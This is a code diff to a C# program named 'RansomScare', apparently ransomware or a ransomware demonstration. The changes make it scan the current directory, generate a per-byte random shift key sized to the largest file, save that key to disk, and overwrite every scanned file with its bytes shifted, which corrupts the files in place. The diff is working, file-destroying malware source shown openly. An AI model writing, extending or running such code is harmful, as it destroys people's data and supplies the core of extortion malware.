@@ -12,21 +12,26 @@ namespace RansomScare
     {
         public void EncryptFiles()
         {
+
+            // Get list of suitable files in directory
+            List<string> files = ScanFiles();
+
+            // Get largest file size in bytes so key is only as long as needed
+            int largestFileBytes = GetLargestFileBytes(files);
+
             // Generate and save key
-            GenerateKey();
+            GenerateKey(largestFileBytes);
 
             // Retrieve saved key
             string key = RetrieveKey();
             
-            // Get list of suitable files in directory
-            List <string> files = ScanFiles();
-
             // Encrypt files
             for(int i  = 0; i < files.Count; i++)
             {
                 EncryptFile(files[i], key);
             }
         }
+
 
         // Directory file scan function
         // returns list of all files in the directory, excluding RansomScare's own
@@ -49,15 +54,32 @@ namespace RansomScare
             return files;
         }
 
-        // Generates and saves key
-        // the key is comprised of two components: targets and shifts
-        // targets indicate which bytes of a file to alter
-        // shifts are numbers to be added to the target bytes to corrupt the file
-        private void GenerateKey()
+
+        // Get largest file's bytes function
+        // returns the size in bytes of the largest file in the directory
+        // used to determine length of the key
+        private int GetLargestFileBytes(List<string> files)
         {
-            
-            // File size in bytes
-            int fileSize = 1024;
+            int bytes = 0;
+
+            for(int i = 0;i < files.Count;i++)
+            {
+                int fileSize = (int) new FileInfo(files[i]).Length;
+                if (fileSize > bytes)
+                {
+                    bytes = fileSize;
+                }
+            }
+
+            return bytes;
+        }
+
+
+        // Generates and saves key
+        // the key is comprised of integers known as shifts
+        // shifts are numbers to be added to the target bytes to corrupt the file
+        private void GenerateKey(int largestFileBytes)
+        {
 
             // Random object
             Random random = new Random();
@@ -65,10 +87,11 @@ namespace RansomScare
             // List of bytes to target
             List<int> targets = new List<int>();
 
-            for(int i = 0; i < (fileSize / 10); i++)
+
+            // Adds targets up to largest file size in directory
+            for (int i = 0; i < largestFileBytes + 1; i++)
             {
-                int target = random.Next(fileSize);
-                targets.Add(target);
+                targets.Add(i);
             }
 
             // Shifts amount for target bytes
@@ -80,45 +103,58 @@ namespace RansomScare
                 shifts.Add(shift);
             }
 
-            // Format targets and shifts into one key
+            // Format key
             string key = "";
 
-            for(int i = 0;i < targets.Count;i++)
+            for(int i = 0;i < shifts.Count;i++)
             {
-                key += targets[i].ToString() + "-" + shifts[i].ToString() + "/";
+                key += shifts[i].ToString() + "-";
             }
+
+            // Remove final '-'
+            key = key.Substring(0, key.Length - 1);
 
             // Save key to file
             File.WriteAllText(Directory.GetCurrentDirectory() + "/key", key);
 
         }
 
+
+        // Key retrieval function
         private string RetrieveKey()
         {
             return File.ReadAllText(Directory.GetCurrentDirectory() + "/key");
         }
 
+
+        // Encrypt file function
+        // encrypts an individual file
         private void EncryptFile(string file, string key)
         {
+            Console.WriteLine(file);
+
+            // Get list of targets and their shift values
+            string[] keys = key.Split('-');
+
             // Creates byte array from file
-            byte[] bytes = File.ReadAllBytes(file);
-        }
+            byte[] fileBytes = File.ReadAllBytes(file);
 
-        // List printing function for debug
-        private void printList(List<string> list) {
-            string output = "[";
-            for (int i = 0; i < list.Count; i++)
-            {
-                output += list[i] + ", ";
+            Console.WriteLine(fileBytes.Length.ToString());
+
+            // Change target bytes
+            for(int i = 0; i < fileBytes.Length; i++)
+            {;
+
+                byte[] shift = BitConverter.GetBytes(Int32.Parse(keys[i]));
+
+                // shift value is always in the first byte, this ensures the byte at index 0 will be used
+                if (!BitConverter.IsLittleEndian) { Array.Reverse(shift); }
+
+                fileBytes[i] = (byte) (fileBytes[i] + shift[0]);
             }
 
-            // Remove final ', ' if list not empty
-            if (list.Count > 0)
-            {
-                output = output.Substring(0, output.Length - 2);
-            }
-            
-            Console.WriteLine(output + "]");
+            // Save file
+            File.WriteAllBytes(file, fileBytes);
         }
     }
 }
